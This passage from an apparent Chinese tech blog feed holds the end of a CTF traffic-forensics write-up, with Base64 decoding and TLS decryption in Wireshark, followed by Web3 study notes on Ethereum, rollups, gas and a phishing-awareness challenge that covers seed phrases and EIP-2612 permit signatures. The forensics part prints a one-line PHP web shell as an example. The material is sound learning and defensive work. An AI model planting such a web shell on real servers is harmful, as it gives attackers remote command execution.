4：Base64/DNS 隐蔽传输</strong></h3><ol><li><p>提取 <strong>Base64 部分</strong>（如 <code>aGVsbG8=</code>）。</p></li><li><p>用 Python 解码：</p><p> python</p> <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">print(base64.b64decode("aGVsbG8="))  # 输出 b'hello'</span><br></pre></td></tr></tbody></table></figure></li></ol><hr><h2 id="步骤-4：分析文件"><a href="#步骤-4：分析文件" class="headerlink" title="步骤 4：分析文件"></a><strong>步骤 4：分析文件</strong></h2><ul><li><p>如果是 <strong>Web Shell</strong>（如 <code>.jsp</code>、<code>.php</code>），可能包含：</p><p>  php</p>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET["cmd"]); ?&gt;</span><br></pre></td></tr></tbody></table></figure></li><li><p>如果是 <strong>Java 类</strong>，可能包含 <strong>恶意代码</strong>（如反弹 Shell）。</p></li></ul></blockquote><blockquote><h2 id="3-如何使用它们解密流量？"><a href="#3-如何使用它们解密流量？" class="headerlink" title="3. 如何使用它们解密流量？"></a><strong>3. 如何使用它们解密流量？</strong></h2><h3 id="方法-1：Wireshark-解密（推荐）"><a href="#方法-1：Wireshark-解密（推荐）" class="headerlink" title="方法 1：Wireshark 解密（推荐）"></a><strong>方法 1：Wireshark 解密（推荐）</strong></h3><ol><li><p><strong>保存密钥到文件</strong>（如 <code>tls-keys.log</code>），格式：</p><p> text</p> <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CLIENT_HANDSHAKE_TRAFFIC_SECRET &lt;hex-id&gt; &lt;key&gt;</span><br><span class="line">SERVER_HANDSHAKE_TRAFFIC_SECRET &lt;hex-id&gt; &lt;key&gt;</span><br><span class="line">CLIENT_TRAFFIC_SECRET_0 &lt;hex-id&gt; &lt;key&gt;</span><br><span class="line">SERVER_TRAFFIC_SECRET_0 &lt;hex-id&gt; &lt;key&gt;</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>配置 Wireshark</strong>：</p><ul><li><code>Edit</code> → <code>Preferences</code> → <code>Protocols</code> → <code>TLS</code></li><li>在 <code>(Pre)-Master-Secret log filename</code> 指定 <code>tls-keys.log</code>。</li></ul></li><li><p><strong>加载抓包文件（<code>.pcap</code>）</strong>，Wireshark 会自动解密 TLS 流量。</p></li></ol></blockquote><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezDecryption"><a href="#ezDecryption" class="headerlink" title="ezDecryption"></a>ezDecryption</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web3 实习计划 - 2025 夏季</title>
      <link href="/2025/08/04/web3-shi-xi-ji-hua-2025-xia-ji/"/>
      <url>/2025/08/04/web3-shi-xi-ji-hua-2025-xia-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Web3-实习计划-2025-夏季"><a href="#Web3-实习计划-2025-夏季" class="headerlink" title="Web3 实习计划 - 2025 夏季"></a>Web3 实习计划 - 2025 夏季</h1><p>在这个Web3实习计划之前，其实我学过一些区块链的内容，但是也仅仅是知道一些概念性的东西，例如，PoW、PoS、defi等一些概念，所以参加这个实习计划也是为了更深入的学习Web3的内容，接下来是我的每日学习笔记</p><h1 id="8月4日"><a href="#8月4日" class="headerlink" title="8月4日"></a>8月4日</h1><h2 id="区块链基础概念"><a href="#区块链基础概念" class="headerlink" title="区块链基础概念"></a>区块链基础概念</h2><h3 id="区块链介绍"><a href="#区块链介绍" class="headerlink" title="区块链介绍"></a>区块链介绍</h3><p>区块链是一种<strong>去中心化</strong>的<strong>分布式账本</strong>技术，用于在网络节点之间安全、透明且不可篡改地记录事务数据</p><ul><li>去中心化：区块链网络通常分布在全球，每个节点都将会存储一份相同的区块链数据。没有人能够控制全部的节点，因此这份区块链数据将会一直存在。</li></ul><h3 id="区块链特性"><a href="#区块链特性" class="headerlink" title="区块链特性"></a>区块链特性</h3><ol><li>不可篡改</li></ol><p>你无法改变历史信息，因为每个区块包含了上一个区块的摘要并串联起来，如果你修改了历史的区块，你将必须修改后面的全部区块。所以交易一旦上链，就无法再更改</p><ol start="2"><li>公开透明、匿名</li></ol><p>在区块链上的信息全部公开透明。每个人都可以顺着区块和链找到历史上所有的记录来查看你的钱包余额。可以在区块链浏览器上进行查看</p><ol start="3"><li>快速交易</li></ol><p>无论金额多少以及你在什么地方，只要你的交易记录被打包在区块链中，交易就自动完成。相比传统的跨国汇款非常快速便捷</p><h3 id="区块链的核心组成部分"><a href="#区块链的核心组成部分" class="headerlink" title="区块链的核心组成部分"></a>区块链的核心组成部分</h3><h4 id="去中心化的网络和区块链"><a href="#去中心化的网络和区块链" class="headerlink" title="去中心化的网络和区块链"></a><strong>去中心化的网络和区块链</strong></h4><p>区块链将会有一条链来记录全部的信息，这条链将存在对应的去中心化网络中。 去中心化的网络，将由无数节点提供服务来维持网络运行。节点通过计算验证交易获得代币奖励</p><h4 id="维持网络运行的代币激励"><a href="#维持网络运行的代币激励" class="headerlink" title="维持网络运行的代币激励"></a><strong>维持网络运行的代币激励</strong></h4><p>去中心化的网络由无数节点提供服务来维持网络运行，整合区块并合并到链上的操作称为<strong>挖矿</strong>。维持这些服务的人一般称之为<strong>矿工</strong>。矿工们维持网络运行会得到代币奖励以及燃料费（Gas Fee）。 你使用这个网络进行交易、转账、铸造 NFT 等等，均需要支付代币</p><h3 id="公链-私链-联盟链"><a href="#公链-私链-联盟链" class="headerlink" title="公链 私链 联盟链"></a>公链 私链 联盟链</h3><p>区块链根据访问权限与治理模式，大致可分为三类。按照去中心化程度从高到低排列</p><p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-04%20205327.png"></p><h4 id="公链（Public-Blockchain）"><a href="#公链（Public-Blockchain）" class="headerlink" title="公链（Public Blockchain）"></a>公链（Public Blockchain）</h4><ul><li><strong>特点</strong>：<ul><li><strong>完全开放</strong>：任何人可参与读写、验证交易或成为节点。</li><li><strong>去中心化</strong>：无单一控制方，数据公开透明，不可篡改。</li><li><strong>激励机制</strong>：通常通过代币（如比特币、以太坊）奖励矿工/验证者。</li><li><strong>性能较低</strong>：因共识机制（如PoW、PoS）需全局节点验证，交易速度较慢。</li></ul></li><li><strong>典型应用</strong>：<ul><li>加密货币（比特币、以太坊）。</li><li>去中心化应用（DApp）、DeFi、NFT等开放生态。</li></ul></li><li><strong>代表案例</strong>：<br>  Bitcoin、Ethereum、Solana。</li></ul><h4 id="私链（Private-Blockchain）"><a href="#私链（Private-Blockchain）" class="headerlink" title="私链（Private Blockchain）"></a>私链（Private Blockchain）</h4><ul><li><strong>特点</strong>：<ul><li><strong>权限封闭</strong>：由单一组织或实体控制，参与者需授权。</li><li><strong>中心化</strong>：节点由管理者指定，交易验证效率高。</li><li><strong>隐私性强</strong>：数据仅对授权方可见，适合企业内部使用。</li><li><strong>无代币激励</strong>：通常无需挖矿，节点由组织自行维护。</li></ul></li><li><strong>典型应用</strong>：<ul><li>企业数据管理、内部审计、供应链追踪等。</li><li>对隐私和效率要求高的封闭场景。</li></ul></li><li><strong>代表案例</strong>：<br>  Hyperledger Fabric（可配置为私链）、R3 Corda。</li></ul><h4 id="联盟链（Consortium-Blockchain）"><a href="#联盟链（Consortium-Blockchain）" class="headerlink" title="联盟链（Consortium Blockchain）"></a>联盟链（Consortium Blockchain）</h4><ul><li><strong>特点</strong>：<ul><li><strong>部分去中心化</strong>：由多个组织联合管理（如银行、企业联盟）。</li><li><strong>准入机制</strong>：节点需许可加入，但参与者间平等协作。</li><li><strong>平衡效率与信任</strong>：共识机制（如PBFT）比公链更快，兼顾一定透明度。</li><li><strong>部分公开</strong>：数据可对成员共享，对外保密。</li></ul></li><li><strong>典型应用</strong>：<ul><li>跨机构业务（跨境支付、贸易金融）。</li><li>行业协作（物流、医疗数据共享）。</li></ul></li><li><strong>代表案例</strong>：<br>  Hyperledger Fabric、FISCO BCOS、Quorum。</li></ul><h4 id="对比总结"><a href="#对比总结" class="headerlink" title="对比总结"></a>对比总结</h4><table><thead><tr><th align="left"><strong>维度</strong></th><th align="left"><strong>公链</strong></th><th align="left"><strong>联盟链</strong></th><th align="left"><strong>私链</strong></th></tr></thead><tbody><tr><td align="left"><strong>控制权</strong></td><td align="left">无中心主体</td><td align="left">多组织共同治理</td><td align="left">单一组织控制</td></tr><tr><td align="left"><strong>参与权限</strong></td><td align="left">完全开放</td><td align="left">需许可加入</td><td align="left">严格授权</td></tr><tr><td align="left"><strong>透明度</strong></td><td align="left">全网公开</td><td align="left">成员间透明</td><td align="left">仅内部可见</td></tr><tr><td align="left"><strong>性能</strong></td><td align="left">低（TPS低，延迟高）</td><td align="left">中（优化共识机制）</td><td align="left">高（中心化处理）</td></tr><tr><td align="left"><strong>用例</strong></td><td align="left">加密货币、开放生态</td><td align="left">跨机构协作</td><td align="left">企业内部管理</td></tr></tbody></table><h4 id="选择依据"><a href="#选择依据" class="headerlink" title="选择依据"></a>选择依据</h4><ul><li><strong>公链</strong>：适合需要完全去中心化和信任透明的场景。</li><li><strong>联盟链</strong>：适合多组织协作且需平衡效率与隐私的行业。</li><li><strong>私链</strong>：适合单一组织追求高效可控的私有化应用。</li></ul><h1 id="8月5日"><a href="#8月5日" class="headerlink" title="8月5日"></a>8月5日</h1><table><thead><tr><th>今日学习内容</th></tr></thead><tbody><tr><td>以太坊概览</td></tr><tr><td>unphishable钓鱼攻防挑战-初级</td></tr></tbody></table><h2 id="以太坊概览"><a href="#以太坊概览" class="headerlink" title="以太坊概览"></a>以太坊概览</h2><h3 id="以太坊介绍"><a href="#以太坊介绍" class="headerlink" title="以太坊介绍"></a>以太坊介绍</h3><p>以太坊（Ethereum）被称为“区块链 2.0”，它不仅是一种加密货币（以太币 ETH），更是一台支持智能合约的“全球共享计算机”。通过代码自动执行规则，开发者可以在区块链上构建去中心化金融（DeFi）、数字艺术品（NFT）和去中心化自治组织（DAO）等创新应用，无需依赖银行或中心化平台。</p><p>以太坊的核心创新在于 <strong>智能合约</strong>（Smart Contracts） 。<u>智能合约是存储在区块链上的可执行代码，能够在满足预设条件时自动执行操作，无需人工干预</u>。这一特性使得以太坊不仅是数字货币的载体，更是构建去中心化应用（Dapps）、去中心化金融（DeFi）、非同质化代币（NFT）等生态系统的基础设施。</p><h3 id="Ethereum-与-Bitcoin-的差异"><a href="#Ethereum-与-Bitcoin-的差异" class="headerlink" title="Ethereum 与 Bitcoin 的差异"></a>Ethereum 与 Bitcoin 的差异</h3><table><thead><tr><th align="center">维度</th><th align="left">比特币（Bitcoin）</th><th align="left">以太坊（Ethereum）</th></tr></thead><tbody><tr><td align="center"><strong>目标与定位</strong></td><td align="left">去中心化的<strong>数字货币</strong>，强调安全、稳定和稀缺性（总量 2100 万枚）</td><td align="left">去中心化平台，支持<strong>智能合约</strong>和 Dapps，定位为“区块链 2.0”</td></tr><tr><td align="center"><strong>编程能力</strong></td><td align="left">脚本语言有限，仅支持简单的交易验证逻辑</td><td align="left">图灵完备的编程语言（如 Solidity），可开发复杂智能合约</td></tr><tr><td align="center"><strong>共识机制</strong></td><td align="left">工作量证明（PoW），矿工通过算力竞争记账权</td><td align="left">从 PoW 转向权益证明（PoS），通过 The Merge 实现能源效率优化</td></tr><tr><td align="center"><strong>交易速度</strong></td><td align="left">每 10 分钟生成一个区块，交易确认较慢</td><td align="left">区块时间约 12 秒，交易确认更快，适合高频应用</td></tr><tr><td align="center"><strong>经济模型</strong></td><td align="left">总量固定，强调抗通胀属性</td><td align="left">供应灵活，通过 EIP-1559 等机制可能呈现通缩趋势</td></tr></tbody></table><h3 id="以太坊的定位与演进"><a href="#以太坊的定位与演进" class="headerlink" title="以太坊的定位与演进"></a>以太坊的定位与演进</h3><h4 id="以太坊1-0（PoW阶段）"><a href="#以太坊1-0（PoW阶段）" class="headerlink" title="以太坊1.0（PoW阶段）"></a>以太坊1.0（PoW阶段）</h4><p>这个阶段就是挖矿，和比特币的机制相同，同样的消耗电力和处理交易速度慢、费用高</p><h4 id="以太坊2-0与The-Merge：从双链并行到完美合并"><a href="#以太坊2-0与The-Merge：从双链并行到完美合并" class="headerlink" title="以太坊2.0与The Merge：从双链并行到完美合并"></a>以太坊2.0与The Merge：从双链并行到完美合并</h4><blockquote><p><strong>The Merge 完整故事</strong>：</p><ol><li><p><strong>2020 年 12 月：信标链启动</strong></p><p> 以太坊团队首先创建了一条全新的<strong>信标链（Beacon Chain）</strong>，专门运行 PoS 共识机制。此时：</p><ul><li>以太坊主网继续使用 PoW 挖矿</li><li>信标链独立运行 PoS 验证</li><li>两条链并行存在，互不干扰</li></ul></li><li><p><strong>2022 年 9 月：历史性合并</strong></p><p> 2022 年 9 月 15 日，<strong>The Merge</strong> 发生：</p><ul><li>以太坊主网“关闭”了 PoW 挖矿引擎</li><li>将共识机制“插接”到信标链的 PoS 系统</li><li>从此，以太坊主网由信标链保护安全</li></ul></li><li><p><strong>合并后的新架构</strong></p><p> 现在的以太坊实际上是两层结构：</p><ul><li><strong>执行层</strong>：处理交易、智能合约（原主网）</li><li><strong>共识层</strong>：管理验证者、确定区块顺序（信标链）</li></ul></li></ol></blockquote><p><strong>PoS机制详解：</strong></p><p><strong>验证者如何工作</strong>：</p><ul><li><strong>准入门槛</strong>：质押 32 ETH 成为验证者</li><li><strong>工作方式</strong>：系统随机选择验证者来提议和验证区块</li><li><strong>奖励机制</strong>：验证者获得新发行的 ETH + 交易费用（gas）</li><li><strong>惩罚机制</strong>：作恶者质押的 ETH 被销毁（Slashing）</li></ul><p><strong>相比 PoW 的优势</strong>：</p><ul><li>**能耗降低 99.95%**：无需大量电力和硬件</li><li><strong>经济安全性</strong>：攻击成本约需控制全网 67% 的质押 ETH（价值数百亿美元）</li><li><strong>最终确定性</strong>：区块确认更快、更可靠</li></ul><h4 id="未来升级路线"><a href="#未来升级路线" class="headerlink" title="未来升级路线"></a>未来升级路线</h4><p>暂时学不懂</p><h3 id="以太坊生态概览：L1、L2、Sidechains-等"><a href="#以太坊生态概览：L1、L2、Sidechains-等" class="headerlink" title="以太坊生态概览：L1、L2、Sidechains 等"></a>以太坊生态概览：L1、L2、Sidechains 等</h3><p>以太坊的生态系统由多层架构组成，包括 <strong>L1（主网）、L2（二层扩展解决方案）、侧链（Sidechains）</strong> 等，共同支持高吞吐量和低费用的交易处理。</p><ol><li>Layer 1（L1）<ul><li><strong>以太坊主网</strong>：核心区块链，负责最终安全性与共识。</li><li><strong>EVM</strong>：以太坊虚拟机，执行智能合约代码。</li><li><strong>账户系统</strong>：外部账户（EOA）与合约账户（CA）共同构成网络基础。</li></ul></li><li>Layer 2（L2）<ul><li>Rollup：通过将交易批量处理后提交至 L1，降低 Gas 费。<ul><li><strong>Optimistic Rollup</strong>：假设交易合法，仅在争议时验证。</li><li><strong>ZK Rollup</strong>：通过零知识证明验证交易，无需链上争议。</li></ul></li></ul></li><li><strong>侧链（Sidechains）</strong>：独立运行的链，通过<strong>桥接</strong>与主网交互。</li><li><strong>以太坊生态分层架构</strong></li></ol><blockquote><p><strong>1. Optimistic Rollup（乐观汇总）</strong></p><p><strong>核心思想</strong></p><p>“默认信任，争议时验证” —— 假设所有提交到链上的交易是合法的，仅在有人提出质疑时进行验证。</p><p><strong>工作流程</strong></p><ol><li><strong>交易打包</strong>：<ul><li>用户将交易发送给排序器（Sequencer），排序器批量打包交易并生成状态根（State Root），提交到主链（如以太坊）。</li><li>主链仅存储交易数据（Calldata），不立即验证。</li></ul></li><li><strong>挑战期（Fraud Proof）</strong>：<ul><li>提交后有一段挑战期（通常 <strong>7天</strong>），任何人可质疑交易有效性。</li><li>如果发现无效交易，验证者提交欺诈证明（Fraud Proof），触发链上计算并回滚错误状态。</li></ul></li><li><strong>最终确认</strong>：<ul><li>若挑战期内无争议，交易最终确认。</li></ul></li></ol><p> <strong>优点</strong></p><ul><li><strong>兼容性强</strong>：支持任意智能合约（EVM 兼容）。</li><li><strong>Gas 成本低</strong>：仅需提交数据，无需复杂计算。</li><li><strong>开发门槛低</strong>：无需零知识证明（ZKP）专业知识。</li></ul><p> <strong>缺点</strong></p><ul><li><strong>提款延迟</strong>：用户需等待挑战期结束（7天）才能提取资金。</li><li><strong>中心化风险</strong>：依赖排序器（Sequencer）快速打包交易。</li><li><strong>安全依赖诚实多数</strong>：若无人监控并提交欺诈证明，恶意交易可能通过。</li></ul><p> <strong>代表项目</strong></p><ul><li><strong>Optimism</strong>、<strong>Arbitrum</strong>（EVM 兼容，主打 DeFi 生态）。</li></ul><hr><p> <strong>2. ZK Rollup（零知识证明汇总）</strong></p><p><strong>核心思想</strong></p><p>“数学证明，即时验证” —— 每批交易通过零知识证明（ZKP）验证有效性，无需争议期。</p><p><strong>工作流程</strong></p><ol><li><strong>交易打包</strong>：<ul><li>排序器收集交易，生成状态变更和有效性证明（ZK-SNARK/STARK）。</li><li>将证明和状态根提交到主链。</li></ul></li><li><strong>链上验证</strong>：<ul><li>主链验证 ZKP，确保交易合法后立即更新状态。</li><li>无需挑战期，交易即时确认。</li></ul></li></ol><p><strong>优点</strong></p><ul><li><strong>即时最终性</strong>：无提款延迟，资金可立即提取。</li><li><strong>更高安全性</strong>：依赖数学证明，无需诚实多数假设。</li><li><strong>隐私性</strong>：可选择性隐藏交易细节（如 Zcash 风格隐私交易）。</li></ul><p><strong>缺点</strong></p><ul><li><strong>计算资源消耗大</strong>：生成 ZKP 需要高性能硬件。</li><li><strong>EVM 兼容性有限</strong>：早期仅支持简单逻辑，现逐步改进（如 zkEVM）。</li><li><strong>开发复杂度高</strong>：需密码学专业知识。</li></ul><p><strong>代表项目</strong></p><ul><li><strong>zkSync</strong>、<strong>StarkNet</strong>、<strong>Scroll</strong>（专注 zkEVM 兼容）。</li></ul></blockquote><p>以太坊生态可以分为以下几个层次：</p><ol><li><strong>应用层（Application Layer）</strong></li></ol><p>用户直接交互的应用和界面：</p><ul><li><strong>DeFi 应用</strong>：Uniswap（去中心化交易所）、Aave（借贷协议）、Compound（借贷协议）</li><li><strong>NFT 平台</strong>：OpenSea、Foundation、SuperRare</li><li><strong>钱包应用</strong>：MetaMask、Coinbase Wallet、Rainbow</li><li><strong>DAO 工具</strong>：Snapshot、Aragon、Colony</li></ul><ol start="2"><li><strong>协议层（Protocol Layer）</strong></li></ol><p>以太坊的核心基础设施：</p><ul><li><strong>共识层客户端</strong>：Prysm、Lighthouse、Nimbus、Teku</li><li><strong>执行层客户端</strong>：Geth、Nethermind、Erigon、Besu</li><li><strong>核心协议</strong>：EVM、状态管理、Gas 机制</li></ul><ol start="3"><li><strong>扩展层（Scaling Layer）</strong></li></ol><p>提升性能和降低成本的解决方案：</p><ul><li><strong>Layer 2 Rollups</strong>：Arbitrum、Optimism、Polygon zkEVM、zkSync Era</li><li><strong>侧链</strong>：Polygon PoS、xDAI（Gnosis Chain）</li><li><strong>状态通道</strong>：Lightning Network for Ethereum</li></ul><h3 id="以太坊文化与价值观"><a href="#以太坊文化与价值观" class="headerlink" title="以太坊文化与价值观"></a>以太坊文化与价值观</h3><p>核心价值观</p><ol><li><strong>去中心化治理（Decentralization）</strong><ul><li>没有单一的控制者或权威机构</li><li>社区通过公开讨论和 EIP（以太坊改进提案）机制共同决策</li><li>验证者遍布全球，防止权力集中</li></ul></li><li><strong>无需许可与开放性（Permissionless &amp; Open）</strong><ul><li>任何人都可以使用、开发、部署智能合约</li><li>开源代码，透明可审计</li><li>无身份、地域、财富限制的参与门槛</li></ul></li><li><strong>抗审查性（Censorship Resistance）</strong><ul><li>交易和智能合约不受政府或机构干预</li><li>通过分布式验证确保网络弹性</li><li>支持言论自由和经济自由</li></ul></li><li><strong>密码朋克精神（Cypherpunk Ethos）</strong><ul><li>代码即法律：用算法和数学构建信任</li><li>密码学保护隐私和自主权</li><li>技术驱动的社会变革，而非政治手段</li></ul></li><li><strong>公共物品导向（Public Goods Orientation）</strong><ul><li>优先考虑生态系统整体利益</li><li>支持开源项目和基础设施建设</li><li>通过各种资助计划推动创新</li></ul></li><li><strong>可持续发展理念</strong><ul><li>The Merge 体现了对环境责任的承诺</li><li>长期主义思维，注重技术的可持续演进</li><li>平衡创新速度与网络稳定性</li></ul></li></ol><h3 id="以太坊核心机制：从账户到执行的完整链路"><a href="#以太坊核心机制：从账户到执行的完整链路" class="headerlink" title="以太坊核心机制：从账户到执行的完整链路"></a>以太坊核心机制：从账户到执行的完整链路</h3><p>以太坊三个关键机制：<strong>账户系统</strong>、<strong>Gas 模型</strong> 和 <strong>以太坊虚拟机（EVM）</strong>。</p><p>（1）账户系统：你的数字身份</p><p><strong>账户系统</strong> 包含由私钥控制的 <strong>外部账户（EOA）</strong> 和由智能合约代码控制的 <strong>合约账户（CA）</strong> 。</p><p>想象你第一次接触以太坊——你需要一个“数字钱包”来参与网络。这个钱包的核心是 <strong>外部账户（EOA）</strong> ，它由一对密钥（私钥和公钥）生成，就像银行账户的密码和账号。私钥是你控制账户的“钥匙”，必须严格保密；公钥通过加密算法生成一个唯一的地址（如 <code>0xAbc...123</code>），你可以把它分享给朋友接收转账。</p><p>除了用户控制的 EOA，还有 <strong>合约账户（CA）</strong> 。它们不像 EOA 那样受私钥控制，而是由代码驱动。比如，你部署一个智能合约（如一个 NFT 市场），区块链会自动生成一个 CA 地址（如 <code>0xDef...456</code>）。这个账户不能主动发起交易，只能通过 EOA 触发——比如你点击“购买 NFT”按钮时，EOA 向 CA 发送交易，CA 的代码自动执行出货逻辑。</p><p>每个账户都包含四个关键字段：</p><ul><li><strong>Nonce</strong>：防止重复交易的计数器（EOA 记录发送次数，CA 记录创建合约次数）。</li><li><strong>余额</strong>：账户持有的 ETH 数量（单位为 Wei）。</li><li><strong>CodeHash</strong>：EOA 为空哈希，CA 存储合约字节码的哈希值。</li><li><strong>StorageRoot</strong>：记录账户数据的 Merkle 树根哈希（如 NFT 归属关系）。</li></ul><p>（2）Gas 模型：交易的燃料费</p><p>当你用钱包使用自己的 EOA 发起一笔交易（比如转账或操作合约），这件事当然 <strong>不会是免费的</strong>，你需要支付“燃料费”——也就是 <strong>Gas</strong>。</p><p>Gas 费用 = <strong>用多少 × 每单位多少钱</strong>，就像你打车一样：</p><ul><li><strong>Gas Limit（限额）</strong>：你最多愿意“烧”多少燃料。 比如你觉得最多可能需要 15 万单位，就设置 150,000。</li><li><strong>Gas Price（单价）</strong>：每单位燃料多少钱，用 Gwei 表示（1 Gwei = 0.000000001 ETH）。 网络越拥堵，价格越贵，就像打车高峰期加价。</li></ul><p>所以，<strong>总费用 = Gas Limit × Gas Price</strong>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">假设你设置 Gas Limit 为 150 000，Gas Price 为 100 Gwei，总费用就是 0.015 ETH。如果实际消耗 120 000 Gas，剩余 30 000 Gas × 100 Gwei = 0.003 ETH 会退还给你。</span><br></pre></td></tr></tbody></table></figure><p>Gas 的存在有两个目的：</p><ul><li><strong>激励矿工/验证者</strong>：你给得越多（Gas Price 越高），他们越愿意优先处理你的交易。</li><li><strong>防止资源滥用</strong>：如果有人想让合约死循环，Gas 会用光，交易失败，系统不会被拖垮。</li></ul><p><u>在 EIP-1559 升级后，Gas Price 被拆分了：</u></p><p>以前，Gas Price 全部给矿工。 现在，分成两部分：</p><ul><li><strong>基础费用（Base Fee）</strong>：每个区块都会有，自动计算，直接销毁（直接消失）来帮助 ETH 通缩，毕竟物以稀为贵。</li><li><strong>小费（Tip）</strong>：你额外加的钱，用来鼓励矿工优先处理你。</li></ul><p>（3）以太坊虚拟机（EVM）：代码的执行引擎</p><p>EVM（Ethereum Virtual Machine）是 <strong>以太坊的“大脑”</strong>，是专门用来<strong>运行智能合约的虚拟计算机</strong>。它运行在每个节点上，确保整个网络在处理代码时，<strong>结果都一致、可信任</strong>。</p><p>EVM 的核心特点：</p><ul><li><strong>图灵完备</strong>：就像真正的电脑一样，EVM 可以执行各种逻辑，比如 if 判断、循环等。</li><li><strong>全球同步</strong>：每个矿工/节点都会自己执行一遍合约代码，保证结果一样。</li><li><strong>隔离安全</strong>：EVM 把合约“关”在一个小房间里运行，不允许它乱访问用户的数据和网络，保护隐私和安全。</li></ul><h2 id="Unphishable钓鱼攻防挑战"><a href="#Unphishable钓鱼攻防挑战" class="headerlink" title="Unphishable钓鱼攻防挑战"></a>Unphishable钓鱼攻防挑战</h2><p>挑战地址：<a href="http://unphishable.io/">unphishable.io</a> </p><h3 id="初级"><a href="#初级" class="headerlink" title="初级"></a>初级</h3><h3 id="No-0x0001-Web3-钱包设置指南"><a href="#No-0x0001-Web3-钱包设置指南" class="headerlink" title="No.0x0001 Web3 钱包设置指南"></a>No.0x0001 Web3 钱包设置指南</h3><p>第一关就是创建一个MetaMask的小狐狸钱包，在这之前我就有一个钱包里。这关也重点强调了助记词的重要性。非常重要！！千万不能泄露，接下来一关我就中招了！</p><p>安全存储助记词方法附上：</p><ul><li>将其写在纸上（多份副本）</li><li>存放在安全、防水、防火的地方</li><li>考虑使用金属备份解决方案以提高耐久性</li><li>切勿以数字方式存储（不要拍照、不要云存储、不要电子邮件）</li><li>切勿与任何人分享，包括”支持人员”</li></ul><p>还有一个点就是要领取Holesky的测试币，找了几个水龙头都不是很好弄，看群里的小伙伴都是用Google水龙头领测试币，但是我的就用不了，Google的水龙头搞抽象，无法领取，问了群里大佬说他是这样的。不过最后找到一个好用的水龙头，不仅之前领了Sepolia的测试币，现在也领了Holesky的测试币，附上地址</p><p><a href="https://www.alchemy.com/faucets/ethereum-sepolia">https://www.alchemy.com/faucets/ethereum-sepolia</a></p><p>但是应该是需要eth主网上有一定量的以太币（0.001 ETH）才能在这里领测试币</p><p>领完测试币，连接钱包，这关就结束了</p><h3 id="No-0x0002-钱包恢复助手"><a href="#No-0x0002-钱包恢复助手" class="headerlink" title="No.0x0002 钱包恢复助手"></a>No.0x0002 钱包恢复助手</h3><p>这是一个ai对话界面，功能是钱包恢复，然后让你输入你的助记词，我看到了这样的字样 “请放心，这是一个安全的环境，您的信息将被加密处理。”然后还真的去找了我的助记词给他添上了，我还特意用ai查了这个平台是否靠谱，结果输入进入，告诉我我被钓鱼了。身为一个学安全的人，我自认为安全意识还是有点的，但是也可能是我还没意识到这个挑战是在做个什么，所以被骗+1。</p><p>所以！！永远不要向任何人透露您的助记词，无论他们声称是谁</p><h3 id="No-0x0003-USDC-Permit-钓鱼模拟"><a href="#No-0x0003-USDC-Permit-钓鱼模拟" class="headerlink" title="No.0x0003 USDC Permit 钓鱼模拟"></a>No.0x0003 USDC Permit 钓鱼模拟</h3><p>这一个内容就到了我要学习的地方，之前没听过。开始学！</p><p>因为一开始还不知道所以还是点了授权，被骗+1</p><blockquote><p>知识点：</p><p><strong>通过使用 EIP-2612 的 <code>permit</code> 签名功能</strong>，用户可以在不预先进行链上授权交易（即无需支付 Gas 费）的情况下，授权第三方合约使用自己的代币（如 USDC、DAI 等）。这是以太坊上一种更高效、更省 Gas 的授权方式，尤其适合优化用户体验（UX）和批量操作。</p><p><strong>1. EIP-2612 <code>permit</code> 的核心机制</strong></p><p> <strong>（1）传统授权（<code>approve</code>）的问题</strong></p><ul><li>需要发送一笔链上交易（支付 Gas）。</li><li>用户必须提前授权，导致交互流程变长。</li></ul><p> <strong>（2）<code>permit</code> 的改进</strong></p><p>✅ <strong>免 Gas 授权</strong>：用户签署一条链下消息（签名），第三方合约可凭此签名直接获得代币使用权，无需用户预先发送 <code>approve</code> 交易。<br>✅ <strong>单次有效</strong>：签名可设置过期时间（<code>deadline</code>），避免长期风险。<br>✅ <strong>兼容 ERC-20</strong>：无需修改代币标准，只需代币合约实现 <code>permit</code> 函数。</p><p> <strong>2. <code>permit</code> 的工作原理</strong></p><p> <strong>（1）用户签署离线消息</strong></p><p>用户对以下数据进行签名（使用 EIP-712 结构化签名）：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  owner: "0x用户地址",       // 代币持有者</span><br><span class="line">  spender: "0x合约地址",    // 被授权方（如 Uniswap）</span><br><span class="line">  value: 1000000,          // 授权数量（如 1 USDC = 1e6）</span><br><span class="line">  nonce: 123,              // 防止重放攻击</span><br><span class="line">  deadline: 1698765432     // 过期时间（UNIX 时间戳）</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p> <strong>（2）第三方合约提交签名</strong></p><p>合约调用代币的 <code>permit</code> 方法，传入签名数据：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token.permit(owner, spender, value, deadline, v, r, s);</span><br></pre></td></tr></tbody></table></figure><ul><li><code>v, r, s</code> 是签名的 ECDSA 参数。</li><li>代币合约验证签名，并更新授权状态（相当于执行了 <code>approve</code>）。</li></ul><p> <strong>3. 安全注意事项</strong></p><p> <strong>✅ 优点</strong></p><ul><li><strong>节省 Gas</strong>：用户只需签一次名，无需单独发 <code>approve</code> 交易。</li><li><strong>更短交互流程</strong>：适合钱包内直接签名授权。</li></ul><p> <strong>⚠️ 风险</strong></p><ul><li><strong>签名钓鱼</strong>：恶意 DApp 可能诱导用户签署高额 <code>permit</code>（检查 <code>value</code> 